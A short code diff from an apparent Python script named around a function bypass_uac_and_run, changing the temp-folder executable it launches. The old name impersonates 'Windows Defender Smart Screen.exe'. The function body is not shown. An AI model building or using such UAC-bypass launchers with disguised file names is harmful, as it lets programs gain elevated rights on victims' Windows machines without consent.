@@ -39,6 +39,6 @@ def bypass_uac_and_run(exe_path):
 
 if __name__ == "__main__":
     # Senin istediğin dosya yolu
-    target_exe = r"%temp%\"Windows Defender Smart Screen.exe"
+    target_exe = r"%temp%\"asd.exe"
     
     bypass_uac_and_run(target_exe)
